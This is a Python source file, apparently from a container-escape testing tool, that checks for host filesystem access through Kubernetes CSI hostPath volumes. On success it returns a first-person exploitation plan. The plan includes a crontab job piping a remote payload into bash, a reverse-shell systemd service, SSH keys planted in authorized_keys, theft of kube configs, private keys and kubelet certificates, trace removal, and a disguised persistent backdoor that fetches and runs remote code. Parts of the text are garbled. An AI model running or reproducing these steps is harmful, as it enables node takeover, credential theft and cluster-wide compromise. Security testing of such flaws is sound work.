"""
CSI Plugin Escape Checker

Checks possibilities of exploitation via vulnerable CSI plugin with hostPath.
"""

import os
import socket
import json
import asyncio
from ....proto import EscapeAttemptResult
from utils.async_subprocess import run_exec


class CSIPluginEscapeChecker:
    """Checks CSI plugin hostPath escape possibilities"""
    
    def __init__(self, plugin_instance):
        self.plugin = plugin_instance
    
    async def check(self) -> EscapeAttemptResult:
        """Checking possibilities of exploitation via vulnerable CSI plugin with hostPath."""
        try:
            # Checking for mounted CSI volumes
            csi_mounts = []
            try:
                with open('/proc/self/mountinfo', 'r') as f:
                    mount_info = f.read().splitlines()
                    for line in mount_info:
                        if 'csi' in line.lower():
                            csi_mounts.append(line)
            except Exception:
                pass
                
            # Checking for CSI drivers in cluster
            token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
            csi_drivers_found = []
            
            if os.path.exists(token_path):
                try:
                    token = (await asyncio.to_thread(lambda: open(token_path, "r").read())).strip()
                        
                    api_server = os.environ.get("KUBERNETES_SERVICE_HOST", "kubernetes.default.svc")
                    api_port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
                    
                    # Requesting list CSI drivers
                    csi_cmd = [
                        'curl', '-s',
                        f'https://{api_server}:{api_port}/apis/storage.k8s.io/v1/csidrivers',
                        '--header', f'Authorization: Bearer {token}',
                        '--cacert', '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'
                    ]
                    
                    rc, out, _ = await run_exec(csi_cmd, timeout=5)
                    if rc == 0 and "items" in out:
                        try:
                            csi_data = json.loads(out)
                            if "items" in csi_data:
                                for driver in csi_data["items"]:
                                    if driver.get("metadata", {}).get("name"):
                                        csi_drivers_found.append(driver["metadata"]["name"])
                        except json.JSONDecodeError:
                            pass
                except Exception:
                    pass
                    
            # Checking for access to host root file system via CSI volume
            host_fs_access = False
            mount_paths = []
            
            # Checking candidates for access to host
            candidate_paths = [
                "/var/lib/kubelet/pods",   # Typical path to pod volumes
                "/var/lib/csi",            # Often used CSI drivers
                "/csi-data-dir",           # Used by some CSI drivers
                "/var/lib/csi-hostpath"    # Used by hostpath CSI driver
            ]
            
            for path in candidate_paths:
                if os.path.exists(path) and os.access(path, os.R_OK):
                    try:
                        # Checking if we can see host files
                        host_files = os.listdir(path)
                        if host_files:
                            host_fs_access = True
                            mount_paths.append(path)
                    except Exception:
                        pass
            
            # Checking access to critical host directories via mounted volumes
            critical_host_paths = ["/etc", "/root", "/home", "/var/run", "/run"]
            accessible_host_paths = []
            
            for path in critical_host_paths:
                if os.path.exists(path) and os.access(path, os.R_OK):
                    # Checking, is this not a standard path in container
                    is_host_path = False
                    try:
                        items = os.listdir(path)
                        # Checking if this looks like host directory
                        if path == "/etc" and "hostname" in items and "hosts" in items:
                            # Checking if hostname matches container hostname
                            with open("/etc/hostname", "r") as f:
                                container_hostname = f.read().strip()
                            
                            # If hostname from /etc does not match container hostname,
                            # means we probably see host files
                            container_expected_hostname = socket.gethostname()
                            if container_hostname != container_expected_hostname:
                                is_host_path = True
                                
                        elif path == "/root" and len(items) > 2:  # in container usually empty /root
                            is_host_path = True
                            
                        elif path == "/home" and len(items) > 0:  # in container usually empty /home
                            is_host_path = True
                            
                        elif path in ["/var/run", "/run"] and "systemd" in items:
                            is_host_path = True
                            
                        if is_host_path:
                            accessible_host_paths.append(path)
                    except Exception:
                        pass
                        
            # Checking possibility to write to critical host directories
            writable_host_paths = []
            for path in accessible_host_paths:
                try:
                    import secrets
                    test_path = os.path.join(path, f".csi_test_{secrets.token_hex(2)}")
                    with open(test_path, 'w') as f:
                        f.write('test')
                    os.unlink(test_path)
                    writable_host_paths.append(path)
                except Exception:
                    pass
                    
            if host_fs_access or writable_host_paths:
                demo_next = f"""I detected access to host file system via vulnerable CSI plugin! This is critical vulnerability, which allows completely bypassing container isolation. Here is my exploitation plan:

1. I will create malicious script for privilege escalation:
   ```bash
   cat > /tmp/csi_escape.sh << 'EOF'
   #!/bin/bash
   # Creating backdoor with rights root
   
   if [ -w "/etc/crontab" ]; then
     # Adding job to host crontab
     echo "* * * * * root curl -s myrootkit.example.com/payload.sh | bash" >> /etc/crontab
   elif [ -w "/etc/systemd/system" ]; then
     # Creating systemd service on host
     cat > /etc/systemd/system/nodehelper.service << 'EVILSVC'
   [Unit]
   Description=Node Helper Service
   After=network.target
   
   [Service]
   ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'
   Restart=always
   
   [Install]
   WantedBy=multi-user.target
   EVILSVC
   
     # Activating service (if we have Access to systemctl)
     if command -v systemctl &> /dev/null; then
       systemctl enable nodehelper.service
       systemctl start nodehelper.service
     fi
   elif [ -w "/root/.ssh" ]; then
     # Adding SSH key to authorized_keys
     mkdir -p /root/.ssh
     echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGdv1t+3eCacKX..." >> /root/.ssh/authorized_keys
     chmod 600 /root/.ssh/authorized_keys
   elif [ -w "/home" ]; then
     # Searching home directories of users and adding SSH key
     for userdir in /home/*; do
       if [ -d "$userdir" ]; then
         mkdir -p "$userdir/.ssh"
         echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGdv1t+3eCacKX..." >> "$userdir/.ssh/authorized_keys"
         chmod 600 "$userdir/.ssh/authorized_keys"
       fi
     done
   fi
   
   # Extracting sensitive secrets with host
   mkdir -p /tmp/host_secrets
   
   # Copying kubectl config and keys
   if [ -d "/root/.kube" ]; then
     cp -r /root/.kube /tmp/host_secrets/
   fi
   
   if [ -d "/etc/kubernetes" ]; then
     cp -r /etc/kubernetes /tmp/host_secrets/
   fi
   
   # Collecting all private keys
    find /etc/ssl /root/.ssh /home /opt -name "*.key" -o -name "id_rsa" 2>/dev/null | xargs -I {{}} cp {{}} /tmp/host_secrets/ 2>/dev/null
   
   # Extracting secrets from kubelet
   if [ -d "/var/lib/kubelet" ]; then
     find /var/lib/kubelet -name "*.crt" -o -name "*.key" | xargs -I {{}} cp {{}} /tmp/host_secrets/ 2>/dev/null
   fi
   
   # Archiving results
   tar -czf /tmp/host_secrets.tar.gz /tmp/host_secrets 2>/dev/null
   
   # Sending secrets (here can use curl or other method)
   # curl -F "file=@/tmp/host_secrets.tar.gz" http://198.51.100.10/upload
   
   # Hiding traces
   rm -rf /tmp/host_secrets /tmp/host_secrets.tar.gz
   EOF
   
   chmod +x /tmp/csi_escape.sh
   ```

2. Execute script usIng accessible directhisries host:
   ```bash
   # Running exploit
   /tmp/csi_escape.sh
   ```

3. Will check Access this important components cluster via host FS:
   ```bash
   # Getting kubelet config with host
   if [ -f "/etc/kubernetes/kubelet.conf" ]; then
     export KUBECONFIG=/etc/kubernetes/kubelet.conf
     kubectl get pods -A
   fi
   
   # Searching tokens access
   find /var/lib/kubelet/pods -name "token" 2>/dev/null | xargs cat
   
   # Extracting containerd socket for execution new containers
   if [ -S "/run/containerd/containerd.sock" ]; then
     echo "Containerd socket accessible for creation privileged containers"
   fi
   ```

4. Install permanent backdoor on node usIng access this host file system:
   ```bash
   if [ -w "/etc/systemd/system" ]; then
     cat > /etc/systemd/system/monitoring-agent.service << 'EOL'
   [Unit]
   Description=Monitoring Agent Service
   After=network.target
   
   [Service]
   ExecStart=/bin/bash -c 'while true; do sleep 3600; curl -s http://198.51.100.10/check.sh | bash; done'
   Restart=always
   
   [Install]
   WantedBy=multi-user.target
   EOL
   
     # Activating service on host
     systemctl enable monitoring-agent.service
     systemctl start monitoring-agent.service
   fi
   ```

            This scenario exploitation will allow me to get full access to host system node cluster via vulnerable CSI driver with hostPath access. Further I can extract sensitive data, install persistent access and use node for subsequent compromise of entire cluster."""

                return EscapeAttemptResult(
                    method='csi_plugin_escape', 
                    status='exploited', 
                    message=f'detected access to host file system via CSI plugin! Accessible paths: {", ".join(accessible_host_paths)}. Writable paths: {", ".join(writable_host_paths)}',
                    demo_next_steps=demo_next
                )
            
            if csi_mounts or csi_drivers_found:
                return EscapeAttemptResult(
                    method='csi_plugin_escape', 
                    status='suspicious', 
                    message=f'detected CSI drivers in cluster ({", ".join(csi_drivers_found)}), but direct access to host file system not confirmed.'
                )
                
            return EscapeAttemptResult(
                method='csi_plugin_escape', 
                status='not_vulnerable', 
                message='No accessible CSI drivers with hostPath access detected.'
            )
        except Exception as e:
            return EscapeAttemptResult(method='csi_plugin_escape', status='error', message=str(e))

